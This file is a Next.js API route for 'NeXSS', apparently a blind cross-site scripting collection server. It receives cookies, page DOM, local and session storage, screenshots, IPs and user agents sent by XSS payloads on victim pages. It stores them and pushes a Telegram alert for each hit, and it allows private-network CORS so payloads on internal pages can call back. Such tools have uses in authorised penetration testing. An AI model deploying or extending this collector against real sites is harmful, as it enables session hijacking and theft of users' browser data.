import { NextRequest, NextResponse } from 'next/server';
import { query, generateId } from '@/lib/db';
import { getClientIP, compressString } from '@/lib/utils';
import { getObjectStorageConfig, uploadToStorage } from '@/lib/object-storage';
import { sendXSSNotification } from '@/lib/telegram';
import { corsHeaders } from '@/lib/cors';
import { checkRateLimit, getClientIPFromRequest, rateLimitExceededResponse } from '@/lib/rate-limit';
import { callbackDataSchema, safeValidate } from '@/lib/validations';
import { processScreenshot, base64ToBuffer } from '@/services/screenshot.service';
import { writeFile, mkdir } from 'fs/promises';
import { join } from 'path';
import { existsSync } from 'fs';

interface CallbackData {
    uri?: string;
    origin?: string;
    referer?: string;
    cookies?: string;
    dom?: string;
    screenshot?: string;
    screenshot_error?: string;
    localstorage?: string;
    sessionstorage?: string;
    'user-agent'?: string;
    ip?: string;
    ip_info?: string;
    extra?: Record<string, unknown>;
}

function jsonResponse(data: unknown, status = 200) {
    return NextResponse.json(data, {
        status,
        headers: corsHeaders,
    });
}

// GET - Return info about the callback endpoint
export async function GET() {
    return jsonResponse({
        name: 'NeXSS Callback Endpoint',
        status: 'active',
    });
}

// POST - Receive XSS callback data
export async function POST(request: NextRequest) {
    try {
        // Rate limiting - 30 requests/minute per IP for callback
        const clientIP = getClientIPFromRequest(request);
        const rateLimitResult = checkRateLimit(clientIP, 'callback');
        
        if (!rateLimitResult.allowed) {
            return rateLimitExceededResponse(rateLimitResult);
        }

        // Parse incoming data - be very permissive
        let data: CallbackData;

        const contentType = request.headers.get('content-type') || '';

        if (contentType.includes('application/json')) {
            data = await request.json();
        } else if (contentType.includes('application/x-www-form-urlencoded') || contentType.includes('text/plain')) {
            const text = await request.text();
            try {
                data = JSON.parse(text);
            } catch {
                const params = new URLSearchParams(text);
                data = Object.fromEntries(params.entries());
            }
        } else {
            try {
                data = await request.json();
            } catch {
                return jsonResponse({ error: 'Invalid content type' }, 400);
            }
        }

        if (!data || typeof data !== 'object') {
            return jsonResponse({ error: 'Invalid data' }, 400);
        }

        // Validate with Zod schema (lenient for XSS data)
        const validation = safeValidate(callbackDataSchema, data);
        if (!validation.success) {
            console.warn('[NeXSS] Callback validation warning:', validation.error);
            // Don't reject - XSS data can be malformed, just log it
        } else {
            data = validation.data as CallbackData;
        }

        // Get client IP from data or request headers
        const reportIP = data.ip || getClientIP(request);

        // Get user agent
        const userAgent = data['user-agent'] || request.headers.get('user-agent') || '';

        // Determine origin - always just hostname, no protocol/port
        let origin = '';

        // First try from data.origin (sent by payload)
        if (data.origin) {
            // Strip any protocol if present
            origin = data.origin.replace(/^https?:\/\//, '').split(':')[0].split('/')[0];
        }

        // If not set, try to extract from URI
        if (!origin && data.uri) {
            try {
                origin = new URL(data.uri).hostname;
            } catch {
                origin = '';
            }
        }

        // Fallback to request origin header
        if (!origin) {
            const reqOrigin = request.headers.get('origin') || '';
            origin = reqOrigin.replace(/^https?:\/\//, '').split(':')[0].split('/')[0] || 'unknown';
        }

        // Generate report ID
        const reportId = generateId();

        // Create report
        await query(
            `INSERT INTO reports (id, uri, origin, referer, user_agent, ip, ip_info, cookies)
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
            [
                reportId,
                data.uri?.substring(0, 2000) || null,
                origin.substring(0, 500),
                data.referer?.substring(0, 2000) || null,
                userAgent.substring(0, 1000) || null,
                reportIP.substring(0, 100) || null,
                data.ip_info || null,
                data.cookies || null,
            ]
        );

        // Store large data separately
        let dom = data.dom || null;
        let compressed = false;

        // Compress DOM if it's large
        if (dom && dom.length > 100000) {
            try {
                dom = await compressString(dom);
                compressed = true;
            } catch {
                // Keep uncompressed if compression fails
            }
        }

        // Process screenshot - save optimized version + thumbnail
        const screenshot = data.screenshot || null;
        let screenshotPath: string | null = null;
        let screenshotStorage: string | null = null;
        let screenshotBuffer: Buffer | null = null;
        
        if (screenshot) {
            try {
                // Convert base64 to buffer
                const originalBuffer = base64ToBuffer(screenshot);
                
                // Process screenshot: optimize and generate thumbnail
                const processed = await processScreenshot(originalBuffer, {
                    generatePreview: false,
                    maxWidth: 1920,
                    quality: 85,
                });
                
                screenshotBuffer = processed.optimized; // Use optimized for Telegram
                const fileExt = 'webp'; // Use WebP for better compression
                const fileName = `${reportId}.${fileExt}`;
                const thumbFileName = `${reportId}_thumb.${fileExt}`;
                
                // Check if object storage is enabled
                const storageConfig = await getObjectStorageConfig();
                
                if (storageConfig.enabled) {
                    // Upload optimized and thumbnail to object storage
                    const [mainResult] = await Promise.all([
                        uploadToStorage(storageConfig, `screenshots/${fileName}`, processed.optimized, 'image/webp'),
                        uploadToStorage(storageConfig, `screenshots/${thumbFileName}`, processed.thumbnail, 'image/webp'),
                    ]);
                    
                    if (mainResult.success && mainResult.url) {
                        screenshotPath = mainResult.url;
                        screenshotStorage = 's3';
                        // Thumbnail also uploaded but we don't store path in DB
                    } else {
                        console.error('[NeXSS] Object storage upload failed, falling back to local:', mainResult.error);
                        throw new Error('Object storage upload failed');
                    }
                } else {
                    // Save to local file system
                    const screenshotsDir = join(process.cwd(), 'data', 'screenshots');
                    if (!existsSync(screenshotsDir)) {
                        await mkdir(screenshotsDir, { recursive: true });
                    }
                    
                    // Save both optimized and thumbnail
                    await Promise.all([
                        writeFile(join(screenshotsDir, fileName), processed.optimized),
                        writeFile(join(screenshotsDir, thumbFileName), processed.thumbnail),
                    ]);
                    
                    screenshotPath = `/screenshots/${fileName}`;
                    // Thumbnail saved as ${thumbFileName} but we don't store path in DB
                    screenshotStorage = 'local';
                }
                
                console.log(`[NeXSS] Screenshot processed: ${Math.round(processed.metadata.originalSize / 1024)}KB -> ${Math.round(processed.metadata.optimizedSize / 1024)}KB (thumb: ${Math.round(processed.metadata.thumbnailSize / 1024)}KB)`);
            } catch (err) {
                console.error('[NeXSS] Failed to save screenshot:', err);
                
                // Check if we're in a serverless environment (read-only filesystem)
                const isServerless = process.cwd().startsWith('/var/task') || 
                                     process.env.AWS_LAMBDA_FUNCTION_NAME || 
                                     process.env.VERCEL;
                
                if (isServerless) {
                    // In serverless: cannot use local filesystem, need Object Storage (S3)
                    console.warn('[NeXSS] Screenshot skipped: Configure Object Storage (S3/R2/MinIO) in Settings for serverless environments');
                    screenshotPath = null;
                    screenshotStorage = null;
                    // Set screenshot_error so user knows why screenshot is missing
                    data.screenshot_error = 'Serverless environment detected (Vercel/Lambda). Local filesystem is read-only. Please configure Object Storage (S3/R2/MinIO) in Settings > Storage to save screenshots.';
                } else {
                    // Not serverless: try local storage with original buffer
                    try {
                        const buffer = base64ToBuffer(screenshot);
                        const fileName = `${reportId}.png`;
                        const screenshotsDir = join(process.cwd(), 'data', 'screenshots');
                        if (!existsSync(screenshotsDir)) {
                            await mkdir(screenshotsDir, { recursive: true });
                        }
                        await writeFile(join(screenshotsDir, fileName), buffer);
                        screenshotPath = `/screenshots/${fileName}`;
                        screenshotStorage = 'local';
                        screenshotBuffer = buffer;
                    } catch (localErr) {
                        console.error('[NeXSS] Local fallback also failed:', localErr);
                        screenshotPath = null;
                        screenshotStorage = null;
                    }
                }
            }
        }

        // Store report data with ULID
        // screenshot column now stores path (for local/s3) or null
        // screenshot_storage indicates where it's stored: 'local', 's3', 'db' (legacy), or null
        const reportDataId = generateId();
        await query(
            `INSERT INTO reports_data (id, report_id, dom, screenshot, screenshot_storage, screenshot_error, localstorage, sessionstorage, extra, compressed)
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)`,
            [
                reportDataId,
                reportId,
                dom,
                screenshotPath,
                screenshotStorage,
                data.screenshot_error || null,
                data.localstorage || null,
                data.sessionstorage || null,
                data.extra ? JSON.stringify(data.extra) : null,
                compressed,
            ]
        );

        // Send Telegram notification (async, don't wait)
        sendXSSNotification({
            id: reportId,
            uri: data.uri || null,
            origin: origin,
            ip: reportIP,
            userAgent: userAgent,
            triggeredAt: new Date().toISOString(),
            screenshotBuffer: screenshotBuffer,
        }).catch(err => console.error('[Telegram] Notification error:', err));

        return jsonResponse({
            status: 'success',
            id: reportId,
        });

    } catch (error) {
        console.error('[NeXSS] Callback error:', error);
        return jsonResponse({ error: 'Internal server error' }, 500);
    }
}

// Handle CORS preflight - MUST respond to all preflight requests
export async function OPTIONS(request: NextRequest) {
    const headers: Record<string, string> = {
        ...corsHeaders,
    };
    
    // Handle Private Network Access preflight
    const privateNetworkHeader = request.headers.get('Access-Control-Request-Private-Network');
    if (privateNetworkHeader) {
        headers['Access-Control-Allow-Private-Network'] = 'true';
    }
    
    return new NextResponse(null, {
        status: 204,
        headers,
    });
}
